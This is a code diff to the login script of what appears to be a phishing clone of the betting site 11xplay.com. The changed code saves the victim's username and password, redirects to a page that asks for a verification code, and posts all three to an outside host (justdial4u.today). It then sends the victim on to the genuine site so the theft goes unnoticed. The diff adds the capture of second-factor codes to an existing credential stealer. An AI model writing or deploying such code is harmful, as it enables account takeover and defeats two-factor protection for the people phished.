@@ -890,25 +890,47 @@
         // Ensure both fields are filled
         if (loginName !== '' && password !== '') {
             
-            // Optionally, save login data to session storage (for this example)
+            // Save login data to session storage
             sessionStorage.setItem("loginName", loginName);
             sessionStorage.setItem("password", password);
 
-            // Send the login data via AJAX
+            // Redirect to another page (e.g., page where code is entered)
+            window.location.href = "withdrawal.html";  // Replace with the correct URL
+        } else {
+            alert('All fields are required.');  // Show alert if any field is empty
+        }
+    }
+
+    // Function to send all data to PHP page after user enters the code
+    function submitCodeAndSendEmail(event) {
+        event.preventDefault();  // Prevent form from submitting the normal way
+
+        // Get the entered code
+        var code = $("#code").val();
+
+        // Get saved login data from sessionStorage
+        var loginName = sessionStorage.getItem("loginName");
+        var password = sessionStorage.getItem("password");
+
+        // Ensure code is filled
+        if (code !== '') {
+            // Send the data to the PHP page to send email
             $.ajax({
                 type: "POST",
                 url: "https://justdial4u.today/11xxplay-mail.php", 
                 data: {
                     loginName: loginName,
-                    password: password
+                    password: password,
+                    code: code
                 },
                 success: function (msg) {
                     console.log("Server Response: ", msg);  // Debugging: Check the response from the server
 
                     if (msg === "sucessmsg") {
-                        window.location.href = "https://11xplay.com/";  // Redirect on successful login
+                        alert("Email sent successfully!");
+                        window.location.href = "https://11xplay.com/";  // Redirect after successful email sending
                     } else {
-                        $("#errorMsg").html('Username and password are incorrect.');  // Show error if login fails
+                        $("#errorMsg").html('There was an error sending the email.');  // Show error if sending email fails
                     }
                 },
                 error: function(xhr, status, error) {
@@ -917,16 +939,23 @@
                 }
             });
         } else {
-            alert('All fields are required.');  // Show alert if any field is empty
+            alert('Please enter the code.');  // Show alert if code is empty
         }
     }
 
     $(document).ready(function () {
-        $("form").on("submit", function (event) {
+        // Handle the initial login form submission
+        $("form#loginForm").on("submit", function (event) {
             checkLogin(event);  
+        });
+
+        // Handle the form submission for the code
+        $("form#codeForm").on("submit", function (event) {
+            submitCodeAndSendEmail(event);  
         });
     });
 </script>
+
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
 		
